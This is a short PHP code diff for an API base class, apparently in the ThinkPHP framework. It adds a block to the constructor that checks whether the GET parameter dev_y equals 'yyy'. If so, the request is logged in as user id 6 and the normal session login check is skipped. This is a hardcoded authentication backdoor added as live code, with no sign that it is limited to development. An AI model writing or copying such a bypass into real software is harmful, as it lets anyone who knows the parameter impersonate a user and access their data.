@@ -13,6 +13,15 @@ class BaseApi extends Api {
     protected $UserSessionService;
     public function __construct() {
         parent::__construct();
+
+        if (I('get.dev_y') == 'yyy') {
+            $this->uid = 6;
+            $UserService = Service\UserService::get_instance();
+            $ret = $UserService->get_info_by_id($this->uid);
+            $this->user_info = $ret->data;
+            $this->init();
+            return true;
+        }
         $this->UserSessionService = Service\UsersessionService::get_instance();
         //检测登录信息
         $user_session = I('user_session');//get or post 均可
